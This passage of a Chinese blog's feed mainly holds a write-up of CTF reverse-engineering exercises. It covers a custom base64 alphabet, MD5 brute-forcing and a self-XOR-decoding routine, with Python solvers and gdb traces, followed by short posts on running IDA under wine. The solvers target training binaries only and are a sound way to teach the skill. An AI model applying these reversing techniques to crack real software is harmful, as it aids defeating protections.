    <link href="https://l1b0.fun/2018/07/28/InForSec%E5%A4%8F%E4%BB%A4%E8%90%A5-%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%AD%E7%BB%83%E8%90%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://l1b0.fun/2018/07/28/InForSec夏令营-二进制训练营总结/</id>
    <published>2018-07-28T12:10:39.000Z</published>
    <updated>2019-09-17T12:13:11.537Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这次训练营的内容主要是逆向的入门和pwn的shellcode的编写，个人感觉逆向没讲什么东西，pwn的话shellcode还是不会写hh，这里总结一下期间写的逆向的题目．</p></blockquote><a id="more"></a><h3 id="0x00-level0-明文比较"><a href="#0x00-level0-明文比较" class="headerlink" title="0x00 level0-明文比较"></a>0x00 level0-明文比较</h3><h4 id="方法一：ida得到伪代码把flag直接拿出来"><a href="#方法一：ida得到伪代码把flag直接拿出来" class="headerlink" title="方法一：ida得到伪代码把flag直接拿出来"></a>方法一：ida得到伪代码把flag直接拿出来</h4><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftnk8i7108j30ei0afgmm.jpg" alt="深度截图20180726205418"></p><h4 id="方法二：ltrace命令"><a href="#方法二：ltrace命令" class="headerlink" title="方法二：ltrace命令"></a>方法二：ltrace命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace ./level0</span><br></pre></td></tr></table></figure><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1ftnk94ar86j30j907iwfr.jpg" alt="img"></p><p>综上得到<strong>flag{welc0me_to_inforsec}</strong></p><h3 id="0x01-level1-类base64"><a href="#0x01-level1-类base64" class="headerlink" title="0x01 level1-类base64"></a>0x01 level1-类base64</h3><p>题目流程大致就是输入一串字符，经过sub_400750函数后与字符串<strong>ZmxhZ3tiNHNlNjRXafNXczFtcGxlXQ==</strong>比较．对ctf打的比较多的人一看就猜是base64，但具体是不是呢，我把这串字符用原版的base64解码之后得到</p><blockquote><p>flag{b4se64Wi\xf3Ws1mple]</p></blockquote><p>其中有不可见字符，并且结尾也不对，于是看了看sub_400750函数，把模板提出来</p><blockquote><p>ABCDEFGHIJKLMNOPQRSTUVWfYZabcdeXghijklmnopqrstuvwxyz0123456789+/</p></blockquote><p>以此进行base64解码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__Auther__ = &apos;L1B0&apos; </span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line">from libnum import s2n,n2s</span><br><span class="line">from itertools import permutations </span><br><span class="line">from ctypes import c_int32</span><br><span class="line"></span><br><span class="line">table = &apos;&apos;&apos;ABCDEFGHIJKLMNOPQRSTUVWfYZabcdeXghijklmnopqrstuvwxyz0123456789+/\x00&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">def decodeBase64(src):</span><br><span class="line">    delPaddingTail = &#123;0: 0, 2: 4, 1: 2&#125;</span><br><span class="line">    value = &apos;&apos;</span><br><span class="line">    n = src.count(&apos;=&apos;)</span><br><span class="line">    sin = src[:len(src) - n]</span><br><span class="line">    for c in sin:</span><br><span class="line">        value += bin(table.find(c))[2:].zfill(6)</span><br><span class="line">    value = value[:len(value) - delPaddingTail[n]]</span><br><span class="line">    #  print value</span><br><span class="line">    middle = []</span><br><span class="line">    for i in range(8, len(value) + 1, 8):</span><br><span class="line">        middle.append(int(value[i-8:i], 2))</span><br><span class="line">    output = middle</span><br><span class="line">    out =  hex(s2n(&apos;&apos;.join(map(chr, output))))[2: -1]</span><br><span class="line">    #  print out</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">crypto = &apos;ZmxhZ3tiNHNlNjRXafNXczFtcGxlXQ&apos;</span><br><span class="line">print n2s(0x666c61677b6234736536345f69735f73316d706c657d)</span><br></pre></td></tr></table></figure><blockquote><p>flag{b4se64_is_s1mple}</p></blockquote><h3 id="0x02-level2-2017国赛数独"><a href="#0x02-level2-2017国赛数独" class="headerlink" title="0x02 level2-2017国赛数独"></a>0x02 level2-2017国赛数独</h3><p>待补充</p><h3 id="0x03-level3-md5爆破"><a href="#0x03-level3-md5爆破" class="headerlink" title="0x03 level3-md5爆破"></a>0x03 level3-md5爆破</h3><p>题目大致流程是输入一个长度为16的<strong>数字</strong>，并且均分成四段，每段的大小均比前一段大，且每一段都大于999．然后每一段会经过sub_40083C函数的处理得到其md5，最后要符合sub400bbe函数的验证．</p><p>题目的主要难度在于你在伪代码中看不出sub_40083C函数的作用（赛棍除外），我的解决方法是用gdb跟一下，将得到的结果和自己猜测的结果对比验证．</p><h4 id="sub-40083C函数"><a href="#sub-40083C函数" class="headerlink" title="sub_40083C函数"></a>sub_40083C函数</h4><p>一开始我并不知道sub_40083C函数是干什么的．．．当我点进去后看到下面这串数后感觉和md5算法的数很像，百度一发发现就是md5的数．</p><blockquote><p>v6 = 1732584193;</p><p>v7 = -271733879;</p><p>v8 = -1732584194;</p><p>v9 = 271733878;</p></blockquote><p>接着我用gdb验证了我的想法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb level3</span><br><span class="line">b *0x400f4a</span><br><span class="line">r 1234123512361237</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line">*RDX  0x55</span><br><span class="line">*RDI  0x55d03e31</span><br><span class="line">*RSI  0x7fffffffcb9c ◂— 0x155d03e31</span><br><span class="line">*R8   0x603090 ◂— 0x0</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x8ba</span><br><span class="line">*R11  0x7ffff7ab54e0 (free) ◂— mov    rax, qword ptr [rip + 0x31da11]</span><br><span class="line"> R12  0x4006b0 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffccc0 ◂— 0x2</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffcbe0 —▸ 0x401100 ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffcb40 —▸ 0x7fffffffccc8 —▸ 0x7fffffffcfbd ◂— 0x696c2f656d6f682f (&apos;/home/li&apos;)</span><br><span class="line">*RIP  0x400f5f ◂— lea    rdx, [rbp - 0x40]</span><br><span class="line">───────────────────────────────────────[ DISASM ]───────────────────────────────────────</span><br><span class="line">   0x400f4a    lea    rdx, [rbp - 0x50]</span><br><span class="line">   0x400f4e    mov    rax, qword ptr [rbp - 0x78]</span><br><span class="line">   0x400f52    mov    esi, 4</span><br><span class="line">   0x400f57    mov    rdi, rax</span><br><span class="line">   0x400f5a    call   0x40083c</span><br></pre></td></tr></table></figure><p>可以看到，字符串1234经过sub_40083C后，结果存在rdi上，rdi=0x55d03e31，而’1234’的md5值为<strong>81dc9bdb52d04dc20036dbd8313ed055</strong>，基本确定是md5算法．</p><h4 id="sub400BBE函数"><a href="#sub400BBE函数" class="headerlink" title="sub400BBE函数"></a>sub400BBE函数</h4><p>这个函数当时我主要疑惑的是a2和a2[1]取得到底是md5值的哪个位置，经过gdb跟一波可以很容易发现<em>a2和a2[1]取的是md5的前两个byte，比如说’1234’的md5是81dc9bdb52d04dc20036dbd8313ed055，那么</em>a2=0x81，a2[1]=0xdc．</p><p>那么接下来就可以根据sub_400bbe的条件限制爆破出符合的数．</p><h4 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">from string import printable</span><br><span class="line"></span><br><span class="line">def check(a,b):</span><br><span class="line">    s = [0,0,0,0]</span><br><span class="line">    </span><br><span class="line">    x = int(b[:2],16)</span><br><span class="line">    y= int(b[2:4],16)</span><br><span class="line">    if a == &apos;1234&apos;:</span><br><span class="line">        print x,y</span><br><span class="line">    v7 = [(x&amp;0xf)+48,(x&gt;&gt;4) + 48,(y&amp;0xf) + 48,(y&gt;&gt;4) + 48]#优先级问题</span><br><span class="line">    if a==&apos;1234&apos;:</span><br><span class="line">        print v7</span><br><span class="line">    for i in range(4):</span><br><span class="line">        for j in range(4):</span><br><span class="line">            if( s[j]==0 and v7[j] == ord(a[i]) ):</span><br><span class="line">                s[j] = 1</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    for k in range(4):</span><br><span class="line">        if s[k] == 0:</span><br><span class="line">            return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">my_flag = &apos;&apos;</span><br><span class="line">for a in range(10):</span><br><span class="line">    for b in range(10):</span><br><span class="line">        for c in range(10):</span><br><span class="line">            for d in range(10):</span><br><span class="line">                #flag = a+b+c+d</span><br><span class="line">                flag = str(a)+str(b)+str(c)+str(d)</span><br><span class="line">                md5_flag = hashlib.md5()</span><br><span class="line">                md5_flag.update(flag.encode(encoding=&apos;utf-8&apos;))</span><br><span class="line">                #if flag == &apos;0640&apos;:</span><br><span class="line">                #print md5_flag.hexdigest()</span><br><span class="line">                if check(flag,md5_flag.hexdigest()) == 1:</span><br><span class="line">                    print flag</span><br><span class="line">                    my_flag += flag</span><br><span class="line">print my_flag</span><br></pre></td></tr></table></figure><blockquote><p>正确输入：3179679093279624</p><p>CTF{Md5_i3_ea5y}</p></blockquote><h3 id="0x04-level4-gdb跟踪"><a href="#0x04-level4-gdb跟踪" class="headerlink" title="0x04 level4-gdb跟踪"></a>0x04 level4-gdb跟踪</h3><p>题目用ida看了一下发现贼奇怪，call rax导致不能f5，经中矿的一位师傅提示用gdb跟踪．</p><blockquote><p>gdb infosec_level4</p><p>b *(main+178)</p><p>r</p><p>s#单步步入</p><p>n</p><p>s</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x7fffffffcb90 ◂— 0xc180c931485e2beb</span><br><span class="line"> RBX  0x0</span><br><span class="line">*RCX  0x22</span><br><span class="line"> RDX  0x7fffffffcce8 —▸ 0x7fffffffd002 ◂— 0x5f52455454554c43 (&apos;CLUTTER_&apos;)</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffcbc2 ◂— 0x1e230f670d0b060c</span><br><span class="line"> R8   0x400620 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de8cb0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x848</span><br><span class="line"> R11  0x7ffff7a5a1c0 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003c0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffccd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffcbf0 —▸ 0x400590 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp</span><br><span class="line"> RSP  0x7fffffffcb78 —▸ 0x400580 (main+180) ◂— mov    eax, 0</span><br><span class="line">*RIP  0x7fffffffcb99 ◂— 0xf8e2c6ff48133680</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x7fffffffcb92    pop    rsi</span><br><span class="line">   0x7fffffffcb93    xor    rcx, rcx</span><br><span class="line">   0x7fffffffcb96    add    cl, 0x22</span><br><span class="line"> ► 0x7fffffffcb99    xor    byte ptr [rsi], 0x13</span><br><span class="line">   0x7fffffffcb9c    inc    rsi</span><br><span class="line">   0x7fffffffcb9f    loop   0x7fffffffcb99</span><br><span class="line">    ↓</span><br><span class="line"> ► 0x7fffffffcb99    xor    byte ptr [rsi], 0x13</span><br><span class="line">   0x7fffffffcb9c    inc    rsi</span><br><span class="line">   0x7fffffffcb9f    loop   0x7fffffffcb99</span><br></pre></td></tr></table></figure><p>发现一直在进行异或操作，根据题目correct the byte提示，把异或的那串数据提出来进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Author__ = &quot;L1B0@10.0.0.55&quot;</span><br><span class="line"></span><br><span class="line">flag_len = 0x22</span><br><span class="line">flag = [0x0c,0x06,0x0b,0x0d,0x67,0x0f,0x23,0x1e,0x07,0x30,0x3f,0x20,0x05,0x3a,0x04,0x3d,0x13,0x09,0x2f,0x2f,0x38,0x3c,0x1b,0x07,0x0c,0x25,</span><br><span class="line">0x2e,0x7a,0x22,0x27,0x10,0x02,0x09,0x0a]</span><br><span class="line">print len(flag)==flag_len</span><br><span class="line"></span><br><span class="line">for i in range(0,255):</span><br><span class="line">    b = [chr((i^j)&amp;0xff) for j in flag]</span><br><span class="line">    b = &apos;&apos;.join(b)</span><br><span class="line">    print b</span><br><span class="line">    if &apos;ctf&apos; in b:</span><br><span class="line">        print b</span><br></pre></td></tr></table></figure><blockquote><p>FLAG-EiTMzujOpNwYCeervQMFod0hmZHC@</p></blockquote><p>交上去不对．．发现长度为0x22包括了个\n，把@删了就对了．</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这次训练营的内容主要是逆向的入门和pwn的shellcode的编写，个人感觉逆向没讲什么东西，pwn的话shellcode还是不会写hh，这里总结一下期间写的逆向的题目．&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="保研之路" scheme="https://l1b0.fun/categories/%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Linux-IDA-安装-带F5功能</title>
    <link href="https://l1b0.fun/2018/07/06/Linux-IDA-%E5%AE%89%E8%A3%85-%E5%B8%A6F5%E5%8A%9F%E8%83%BD/"/>
    <id>https://l1b0.fun/2018/07/06/Linux-IDA-安装-带F5功能/</id>
    <published>2018-07-06T12:08:07.000Z</published>
    <updated>2019-09-17T12:11:10.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Version-1-0"><a href="#Version-1-0" class="headerlink" title="Version 1.0"></a>Version 1.0</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近在熟悉deepin系统，想着把逆向的一些软件也迁移过去，但像ida，Ollydbg这些工具一般都是在windows下使用，所以会遇到一些麻烦，最好的解决方法其实就是在deepin上装个虚拟机（window_xp的52破解版）hhh，里面啥都有。</p><a id="more"></a><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>首先装个wine</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wine</span><br></pre></td></tr></table></figure><p>然后下载这个<a href="https://pan.baidu.com/s/1PR3C-1X2tkP2dAOi1t-l9g" target="_blank" rel="noopener">安装包</a>？或者叫啥？随便了。。。</p><p>可能有点大，下载会慢一点。</p><h3 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h3><p>打开终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine x64balabala //刚刚下载的文件名</span><br></pre></td></tr></table></figure><p>过程中会叫你安装python2.7，不过linux里自带python，取消即可。</p><h3 id="最后感谢lyd大佬的帮助和提供的文件，膜一发"><a href="#最后感谢lyd大佬的帮助和提供的文件，膜一发" class="headerlink" title="最后感谢lyd大佬的帮助和提供的文件，膜一发:-)"></a>最后感谢lyd大佬的帮助和提供的文件，膜一发:-)</h3><h2 id="Version-2-0"><a href="#Version-2-0" class="headerlink" title="Version 2.0"></a>Version 2.0</h2><blockquote><p>2018.8.18</p></blockquote><p>emmm之前帮学弟装了linux后他们也遇到了如何在linux友好的使用IDA的问题，然后我发现可以直接用<code>wine</code>打开windows下的IDA。。。在deepin里找到你windows下ida所在的文件夹，<code>wine idaexe</code>或<code>wine ida64.exe</code>即可。</p><p>当然，如果装了zsh的话可以直接在<code>.zshrc</code>文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias ida=&apos;wine /media/l1b0/Windows/Program\ Files\ \(x86\)/IDA/ida.exe&apos;</span><br><span class="line">alias ida64=&apos;wine /media/l1b0/Windows/Program\ Files\ \(x86\)/IDA/ida64.exe&apos;</span><br></pre></td></tr></table></figure><p>之后就直接<code>ida filename</code>即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Version-1-0&quot;&gt;&lt;a href=&quot;#Version-1-0&quot; class=&quot;headerlink&quot; title=&quot;Version 1.0&quot;&gt;&lt;/a&gt;Version 1.0&lt;/h2&gt;&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近在熟悉deepin系统，想着把逆向的一些软件也迁移过去，但像ida，Ollydbg这些工具一般都是在windows下使用，所以会遇到一些麻烦，最好的解决方法其实就是在deepin上装个虚拟机（window_xp的52破解版）hhh，里面啥都有。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://l1b0.fun/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Linux-IDA" scheme="https://l1b0.fun/tags/Linux-IDA/"/>
    
  </entry>
  
  <entry>
    <title>Hello-World</title>
    <link href="https://l1b0.fun/2018/07/03/Hello-World/"/>
    <id>https://l1b0.fun/2018/07/03/Hello-World/</id>
    <published>2018-07-03T11:51:52.000Z</published>
    <updated>2019-09-17T11:55:11.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>Welcome to L1B0’s blog!!!</p><p>2018.7.3</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hello-World&quot;&gt;&lt;a href=&quot;#Hello-World&quot; class=&quot;headerlink&quot; title=&quot;Hello World&quot;&gt;&lt;/a&gt;Hello World&lt;/h1&gt;&lt;p&gt;Welcome to L1B0’s blog!!!&lt;/p&gt;
&lt;p&gt;2
      
    
    </summary>
    
    
      <category term="l1b0&#39;s blog" scheme="https://l1b0.fun/categories/l1b0-s-blog/"/>
    
    
  </entry>
  
</feed>
